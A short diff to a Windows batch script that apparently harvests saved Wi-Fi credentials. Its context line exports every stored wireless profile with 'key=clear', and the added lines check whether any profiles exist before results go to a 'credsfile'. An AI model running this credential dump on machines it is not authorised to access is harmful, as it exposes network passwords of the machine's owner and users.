@@ -32,6 +32,16 @@ pushd "%temp%\profiles"
 call :init
 netsh wlan export profile key=clear >nul
 
+:: Check for XML files. If none are found, then there are no saved profiles
+set /a f=0
+for /f %%i in ('dir /b') do (set /a f+=1)
+:: 1 for str2hex.vbs
+if %f%==1 (
+	echo [-] No Wi-Fi profiles have been found.>>%credsfile%
+	goto endRepeat
+)
+
+
 :Repeat
 	:: Get the name of last enumerated xml file
 	set "file="
